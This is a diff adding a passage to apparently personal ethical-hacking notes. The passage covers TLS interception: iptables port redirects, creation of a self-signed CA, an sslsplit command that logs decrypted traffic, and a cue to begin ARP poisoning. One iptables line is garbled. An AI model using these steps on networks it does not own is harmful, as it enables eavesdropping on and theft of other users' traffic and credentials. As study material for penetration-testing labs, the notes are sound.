@@ -1049,6 +1049,34 @@ _gateway (192.168.251.2) at 00:50:56:fd:1e:95 [ether] on ens160
 ```
 
 ___
+>🚦Redicret the traffic from port ```80``` to ```8080``` and ```443```to ```8443```
+
+```bash
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-  ports 8080                     sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
+```
+
+>🧻Create an appropriate self-signed certificate
+
+```bash
+sudo openssl genrsa -out ca.key 4096
+```
+signing all certificates
+```bash
+sudo openssl req -new   -x509 -days 45 -key ca.key -out ca.crt
+```
+
+Folder storing sniff-data and tmp folder
+```bash
+sudo mkdir /tmp/sslsplit; sudo mkdir sniff_data
+```
+
+```bash
+sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S sniff_data -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
+```
+
+Begin arp poisoning.
+
+___
 
 # Ethical Hacking: Wireless Networks
 
